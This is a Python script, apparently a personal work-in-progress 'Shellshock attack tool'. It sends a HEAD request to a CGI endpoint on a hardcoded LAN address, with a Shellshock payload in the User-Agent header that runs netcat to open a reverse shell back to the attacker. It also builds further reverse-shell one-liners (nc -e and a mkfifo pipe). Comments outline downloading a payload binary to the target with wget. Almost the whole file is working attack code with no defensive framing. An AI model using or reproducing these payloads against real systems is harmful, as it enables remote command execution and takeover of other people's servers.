import sys
import requests
import urllib.request
import socket
# Consists of the HEAD request which is sent in addition to the custom headers
def shellshock_http_req(lhost, lport, rhost, rport, target_url):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # Connet to this socket 
   sock_connect = s.connect((rhost, rport))

   ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
   # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string
   rhost_encoded = rhost.encode()
   lhost_encoded = lhost.encode()
   #lport_encoded = lport.encode()
   #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
   #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
   #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argumento
   payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
   
   ''' Don't even need the recv data because the data isn't even coming back to the program... We just fire the payload off that's it '''
   #recv_data = s.recv(4096)
   sys.exit("Sent payload, dipping out lol")
   '''
   Need a way to find out if the socket connected successfully or not and then inform the user
   '''
   s.close()

''' Paste in the URL from the shellshock_dect tool '''
def shellshock_rev_payloads(lhost, lport, target_url):
    ''' WE DON'T NEED TO CRAFT ANYMORE URLs!!! Because, we already have the one we're looking for; we just need to work with it '''
    ''' This is just a text value, no network ops happening '''
    reverse_payloads = []
    ''' Old netcat '''
    reverse_payload_1 = 'nc -e /bin/sh {} {}'.format(lhost, lport)
    ''' Make our reverse shell a binary. Deliver it to target via wget. Wget would be achieved by command execution.
    Host a python server externally, the server downloads your payload. You then issue a reverse shell using netcat
    but instead of -e /bin/sh, you do -e /dev/shm/revpy <- Alias for payload. That's how we'd deliver it. Then catch it on our side
    with full PTY support unlike /bin/sh and other capabilities if we want'''
    ''' New netcat '''
    reverse_payload_2 = "rm /tmp/f;mkfifo  /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(lhost, lport)
    reverse_payloads.append(reverse_payload_1)
    reverse_payloads.append(reverse_payload_2)
    word_response = requests.get(target_url).status_code
    return reverse_payloads

def main():
    lhost = sys.argv[1]
    lport = int(sys.argv[2])
    ''' We get this URL from the shellshock_dect tool '''
    target_url = sys.argv[3]
    print("Shellshock attack tool")
    print("Sending payload\nEnsure to have a listener open on {}".format(lport))
    # This is what we pass into the HEAD request which actually performs shellshock
    payload = shellshock_http_req(lhost,lport,'192.168.0.100', 80, target_url)
    print(payload)


    #Just a GET request ATM. Needs to have a socket attached
    #result = shellshock_rev_payloads(lhost, lport, target_url)
    #for rev_payload in result:
    ''' 
    The payloads should cycle from 1 - ... here until one payload connects back to us 
    Create sockets back to us which contain the payloads
    '''

    ''' 
    Get all the rev shells to send in a get request
     '''

    #    print("Reverse shell payload(s): {}".format(rev_payload))
    '''
    rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
    '''
main()
